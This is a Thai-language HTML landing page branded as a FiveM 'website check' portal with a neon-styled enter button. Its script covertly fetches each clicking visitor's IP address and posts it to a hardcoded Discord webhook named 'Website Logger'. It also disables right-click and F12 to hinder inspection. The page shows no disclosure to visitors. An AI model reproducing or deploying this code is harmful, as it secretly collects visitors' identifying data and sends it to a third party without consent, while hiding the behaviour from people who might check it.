<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>JUTI FIVEM CHECK</title>
  <link rel="shortcut icon" href="https://img2.pic.in.th/pic/415722422_805094774963868_1990052547844511826_n.jpg" type="image/x-icon">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      flex-direction: column;
      position: relative;
    }
    .container {
      text-align: center;
      padding: 30px;
      animation: fadeIn 2s ease-in-out;
    }
    h1 {
      font-size: 4rem;
      color: #ffffff;
      text-shadow: 0 0 10px #00e5ff, 0 0 20px #00e5ff;
      margin-bottom: 20px;
    }
    p {
      font-size: 1.2rem;
      color: #e0f7ff;
      margin-bottom: 40px;
      letter-spacing: 1px;
      text-shadow: 0 0 5px #0077ff;
    }
    .enter-btn {
      padding: 15px 40px;
      font-size: 1.2rem;
      font-weight: bold;
      background: #00bfff;
      border: none;
      color: white;
      border-radius: 50px;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      transition: all 0.4s ease;
      box-shadow: 0 0 15px #00c6ff, 0 0 30px #00c6ff;
    }
    .enter-btn:hover {
      background: #0099cc;
      box-shadow: 0 0 25px #00c6ff, 0 0 40px #00c6ff;
      transform: scale(1.05);
    }
    footer {
      position: absolute;
      bottom: 20px;
      color: #d0f0ff;
      font-size: 0.8rem;
      letter-spacing: 1px;
      text-shadow: 0 0 5px #00e5ff;
    }
    .neon-circle {
      position: absolute;
      width: 400px;
      height: 400px;
      border-radius: 50%;
      background: radial-gradient(circle, #00e5ff88 10%, transparent 70%);
      filter: blur(80px);
      animation: pulse 6s infinite ease-in-out;
      z-index: -1;
    }
    .neon-circle.one {
      top: -150px;
      left: -150px;
    }
    .neon-circle.two {
      bottom: -150px;
      right: -150px;
    }
    .announcement-scroll {
      width: auto;
      background: rgba(255, 255, 255, 0.15);
      color: #ffffff;
      padding: 8px 16px;
      border-radius: 20px;
      box-shadow: 0 0 15px #00e5ff;
      overflow: hidden;
      white-space: nowrap;
      font-size: 1rem;
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 50px;
      backdrop-filter: blur(5px);
    }
    .announcement-scroll p {
      color: #ffffff;
      animation: scroll-left 15s linear infinite;
      margin: 0;
    }
    @keyframes scroll-left {
      0% { transform: translateX(100%); }
      100% { transform: translateX(-100%); }
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.98); }
      to { opacity: 1; transform: scale(1); }
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); opacity: 0.6; }
      50% { transform: scale(1.1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="neon-circle one"></div>
  <div class="neon-circle two"></div>

  <div class="announcement-scroll">
    <p>เว็บไซต์มีปัญหาอะไรสามารถติดต่อได้เลย</p>
  </div>

  <div class="container">
    <h1>WEBSITE CHECK FIVEM</h1>
    <button class="enter-btn" onclick="sendWebhookAndRedirect()">เข้าสู่เว็บไซต์</button>
  </div>

  <script>
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.keyCode == 123) e.preventDefault(); // Block F12
    });

    const webhookURL = 'https://discord.com/api/webhooks/1365639465409843281/cDUjlcmyAoqs3NXRjwAi2upkfgREy5hmPWo5dvapMvyiOWGEv4DDSdC-2oPVjJlaJQNF'; // <<< ใส่ Webhook ของคุณที่นี่

    function sendWebhookAndRedirect() {
      // ดึง IP Address ก่อน
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;

          const payload = {
            content: `IP Address: ${ipAddress}`,
            username: "Website Logger",
            avatar_url: "https://img.icons8.com/fluency/48/000000/rocket.png"
          };

          // ส่งข้อมูลเข้า Webhook
          fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          })
          .then(response => {
            console.log('Webhook with IP sent successfully');
            window.location.href = 'menu.html';
          })
          .catch(error => {
            console.error('Webhook error:', error);
            window.location.href = 'menu.html';
          });
        })
        .catch(error => {
          console.error('IP fetch error:', error);
          window.location.href = 'menu.html';
        });
    }
  </script>

  <footer>© 2025 fivem check. Created by Jox</footer>
</body>
</html>
